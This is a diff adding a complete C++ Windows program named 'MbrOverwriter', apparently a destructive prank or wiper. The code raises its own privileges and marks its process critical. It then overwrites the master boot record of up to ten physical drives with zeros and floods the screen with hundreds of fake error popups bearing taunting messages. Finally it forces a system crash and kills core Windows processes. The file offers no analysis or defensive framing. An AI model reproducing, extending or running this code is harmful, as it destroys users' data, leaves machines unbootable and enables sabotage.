@@ -1,0 +1,365 @@
+#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
+#include <windows.h>
+#include <winternl.h>
+#include <iostream>
+#include <vector>
+#include <string>
+#include <thread>
+#include <chrono>
+#include <random>
+#include <mutex>
+#include <tlhelp32.h>
+#include <commctrl.h>
+#pragma comment(lib, "comctl32.lib")
+#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
+
+namespace MbrOverwriter
+{
+    class Class2
+    {
+    private:
+        class class2
+        {
+        private:
+            static std::mt19937 rng;
+            static std::mutex rng_mutex;
+            static const std::vector<std::wstring> messages;
+
+            class fake_error
+            {
+            public:
+                static LRESULT CALLBACK window_proc(HWND hwnd, UINT u_msg, WPARAM w_param, LPARAM l_param)
+                {
+                    switch (u_msg)
+                    {
+                    case WM_CREATE:
+                    {
+                        CREATESTRUCT* p_create = (CREATESTRUCT*)l_param;
+                        std::wstring* p_msg = (std::wstring*)p_create->lpCreateParams;
+
+                        HICON h_icon = LoadIcon(NULL, IDI_ERROR);
+                        HWND h_pic = CreateWindowEx(0, L"STATIC", L"", SS_ICON | WS_CHILD | WS_VISIBLE,
+                            18, 22, 32, 32, hwnd, NULL, NULL, NULL);
+                        SendMessage(h_pic, STM_SETICON, (WPARAM)h_icon, 0);
+
+                        CreateWindowEx(0, L"STATIC", p_msg->c_str(), WS_CHILD | WS_VISIBLE,
+                            60, 18, 240, 55, hwnd, NULL, NULL, NULL);
+
+                        HWND h_button = CreateWindowEx(0, L"BUTTON", L"ACCEPT", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
+                            220, 95, 80, 28, hwnd, (HMENU)1, NULL, NULL);
+
+                        HFONT h_font = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
+                        SendMessage(hwnd, WM_SETFONT, (WPARAM)h_font, TRUE);
+                        EnumChildWindows(hwnd, [](HWND child, LPARAM font) -> BOOL {
+                            SendMessage(child, WM_SETFONT, (WPARAM)font, TRUE);
+                            return TRUE;
+                            }, (LPARAM)h_font);
+
+                        delete p_msg;
+                        return 0;
+                    }
+                    case WM_COMMAND:
+                    {
+                        if (LOWORD(w_param) == 1)
+                        {
+                            DestroyWindow(hwnd);
+                        }
+                        return 0;
+                    }
+                    case WM_DESTROY:
+                    {
+                        PostQuitMessage(0);
+                        return 0;
+                    }
+                    case WM_CLOSE:
+                    {
+                        DestroyWindow(hwnd);
+                        return 0;
+                    }
+                    }
+                    return DefWindowProc(hwnd, u_msg, w_param, l_param);
+                }
+            };
+
+            static void show_window()
+            {
+                INITCOMMONCONTROLSEX icex;
+                icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
+                icex.dwICC = ICC_STANDARD_CLASSES;
+                InitCommonControlsEx(&icex);
+
+                RECT work_area;
+                SystemParametersInfo(SPI_GETWORKAREA, 0, &work_area, 0);
+                int width = work_area.right - work_area.left;
+                int height = work_area.bottom - work_area.top;
+
+                int x, y;
+                std::wstring* msg_ptr;
+
+                {
+                    std::lock_guard<std::mutex> lock(rng_mutex);
+                    std::uniform_int_distribution<int> dist_x(0, (width - 330) > 0 ? width - 330 : 0);
+                    std::uniform_int_distribution<int> dist_y(0, (height - 160) > 0 ? height - 160 : 0);
+                    std::uniform_int_distribution<int> dist_msg(0, (int)messages.size() - 1);
+
+                    x = dist_x(rng);
+                    y = dist_y(rng);
+                    msg_ptr = new std::wstring(messages[dist_msg(rng)]);
+                }
+
+                HINSTANCE h_instance = GetModuleHandle(NULL);
+                WNDCLASSEX wc = { 0 };
+                wc.cbSize = sizeof(WNDCLASSEX);
+                wc.lpfnWndProc = fake_error::window_proc;
+                wc.hInstance = h_instance;
+                wc.lpszClassName = L"FakeErrorClass";
+                wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
+                wc.hCursor = LoadCursor(NULL, IDC_ARROW);
+
+                RegisterClassEx(&wc);
+
+                HWND hwnd = CreateWindowEx(
+                    WS_EX_DLGMODALFRAME,
+                    L"FakeErrorClass",
+                    L"System Admin",
+                    WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
+                    x, y, 320 + 16, 140 + 39,
+                    NULL, NULL, h_instance, msg_ptr
+                );
+
+                if (hwnd)
+                {
+                    ShowWindow(hwnd, SW_SHOW);
+                    UpdateWindow(hwnd);
+
+                    MSG msg;
+                    while (GetMessage(&msg, NULL, 0, 0))
+                    {
+                        TranslateMessage(&msg);
+                        DispatchMessage(&msg);
+                    }
+                }
+            }
+
+        public:
+            static void spawn(int amount)
+            {
+                std::thread t([amount]()
+                    {
+                        for (int i = 0; i < amount; i++)
+                        {
+                            std::thread window_thread(show_window);
+                            window_thread.detach();
+                        }
+                    });
+
+                t.detach();
+            }
+        };
+
+    public:
+        static void Spawn(int value)
+        {
+            class2::spawn(value);
+        }
+    };
+    std::mt19937 Class2::class2::rng(std::random_device{}());
+    std::mutex Class2::class2::rng_mutex;
+    const std::vector<std::wstring> Class2::class2::messages = {
+        L"You must restart your computer to turn off User Account Control",
+        L"Turn on Virus and Protection",
+        L"Bootdevice is inaccessible",
+        L"Windows is bloated, use arch",
+        L"I use arch btw",
+        L"Enjoy ded",
+        L"HelloWorld('print')",
+        L"BSOD INCOMING",
+        L"YOU ARE AN IDIOT",
+        L"TRY RESTORE YOUR DATA"
+    };
+}
+
+constexpr int BreakOnTermination = 29;
+namespace MbrOverwriter
+{
+    class Class1
+    {
+    public:
+        static int isCritical;
+        typedef NTSTATUS(NTAPI* pfnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+        typedef NTSTATUS(NTAPI* pfnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
+        typedef NTSTATUS(NTAPI* pfnNtSetInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
+        static const uint32_t GenericRead = 0x80000000;
+        static const uint32_t GenericWrite = 0x40000000;
+        static const uint32_t GenericExecute = 0x20000000;
+        static const uint32_t GenericAll = 0x10000000;
+
+        static const uint32_t FileShareRead = 0x1;
+        static const uint32_t FileShareWrite = 0x2;
+        static const uint32_t OpenExisting = 0x3;
+        static const uint32_t FileFlagDeleteOnClose = 0x40000000;
+        static const uint32_t MbrSize = 512u;
+
+        static void KillProcessByName(const std::wstring& processName)
+        {
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnap == INVALID_HANDLE_VALUE) return;
+
+            PROCESSENTRY32W pe;
+            pe.dwSize = sizeof(PROCESSENTRY32W);
+
+            if (Process32FirstW(hSnap, &pe))
+            {
+                do
+                {
+                    if (std::wstring(pe.szExeFile) == processName || std::wstring(pe.szExeFile) == processName + L".exe")
+                    {
+                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                        if (hProc != NULL)
+                        {
+                            TerminateProcess(hProc, 0);
+                            CloseHandle(hProc);
+                        }
+                        break;
+                    }
+                } while (Process32NextW(hSnap, &pe));
+            }
+            CloseHandle(hSnap);
+        }
+
+        static void Main(int argc, char* argv[])
+        {
+            HANDLE hToken;
+            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+            {
+                LUID luid;
+                if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
+                {
+                    TOKEN_PRIVILEGES tp;
+                    tp.PrivilegeCount = 1;
+                    tp.Privileges[0].Luid = luid;
+                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+                    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+                }
+                CloseHandle(hToken);
+            }
+            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+            if (hNtdll)
+            {
+                MbrOverwriter::Class1::pfnNtSetInformationProcess NtSetInformationProcess = nullptr;
+                NtSetInformationProcess = (pfnNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
+                if (NtSetInformationProcess)
+                {
+                    NtSetInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)BreakOnTermination, &MbrOverwriter::Class1::isCritical, sizeof(int));
+                }
+            }
+
+            try
+            {
+                unsigned char mbrData[] = {
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+                };
+
+                HANDLE mbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
+                HANDLE mbr1 = CreateFileW(L"\\\\.\\PhysicalDrive1", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
+                HANDLE mbr2 = CreateFileW(L"\\\\.\\PhysicalDrive2", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
+                HANDLE mbr3 = CreateFileW(L"\\\\.\\PhysicalDrive3", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
+                HANDLE mbr4 = CreateFileW(L"\\\\.\\PhysicalDrive4", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
+                HANDLE mbr5 = CreateFileW(L"\\\\.\\PhysicalDrive5", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
+                HANDLE mbr6 = CreateFileW(L"\\\\.\\PhysicalDrive6", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
+                HANDLE mbr7 = CreateFileW(L"\\\\.\\PhysicalDrive7", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
+                HANDLE mbr8 = CreateFileW(L"\\\\.\\PhysicalDrive8", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
+                HANDLE mbr9 = CreateFileW(L"\\\\.\\PhysicalDrive9", GenericAll, FileShareRead | FileShareWrite, NULL, OpenExisting, 0, NULL);
+
+                DWORD lpNumberOfBytesWritten;
+                WriteFile(mbr, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
+                WriteFile(mbr1, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
+                WriteFile(mbr2, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
+                WriteFile(mbr3, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
+                WriteFile(mbr4, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
+                WriteFile(mbr5, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
+                WriteFile(mbr6, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
+                WriteFile(mbr7, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
+                WriteFile(mbr8, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
+                WriteFile(mbr9, mbrData, MbrSize, &lpNumberOfBytesWritten, NULL);
+
+                if (mbr != INVALID_HANDLE_VALUE) CloseHandle(mbr);
+                if (mbr1 != INVALID_HANDLE_VALUE) CloseHandle(mbr1);
+                if (mbr2 != INVALID_HANDLE_VALUE) CloseHandle(mbr2);
+                if (mbr3 != INVALID_HANDLE_VALUE) CloseHandle(mbr3);
+                if (mbr4 != INVALID_HANDLE_VALUE) CloseHandle(mbr4);
+                if (mbr5 != INVALID_HANDLE_VALUE) CloseHandle(mbr5);
+                if (mbr6 != INVALID_HANDLE_VALUE) CloseHandle(mbr6);
+                if (mbr7 != INVALID_HANDLE_VALUE) CloseHandle(mbr7);
+                if (mbr8 != INVALID_HANDLE_VALUE) CloseHandle(mbr8);
+                if (mbr9 != INVALID_HANDLE_VALUE) CloseHandle(mbr9);
+            }
+            catch (...)
+            {
+            }
+
+            MbrOverwriter::Class2::Spawn(600);
+            MbrOverwriter::Class2::Spawn(150);
+            std::this_thread::sleep_for(std::chrono::milliseconds(12000));
+            BOOLEAN t1;
+            ULONG t2;
+            if (hNtdll)
+            {
+                pfnRtlAdjustPrivilege RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
+                pfnNtRaiseHardError NtRaiseHardError = (pfnNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
+
+                if (RtlAdjustPrivilege)
+                {
+                    RtlAdjustPrivilege(19, TRUE, FALSE, &t1);
+                }
+                if (NtRaiseHardError)
+                {
+                    NtRaiseHardError(0xDEADDEAD, 0, 0, NULL, 6, &t2);
+                }
+            }
+
+            std::this_thread::sleep_for(std::chrono::milliseconds(5));
+            KillProcessByName(L"wininit");
+            KillProcessByName(L"services");
+            KillProcessByName(L"csrss");
+        }
+    };
+    int Class1::isCritical = 1;
+}
+
+int main(int argc, char* argv[])
+{
+    MbrOverwriter::Class1::Main(argc, argv);
+    return 0;
+}
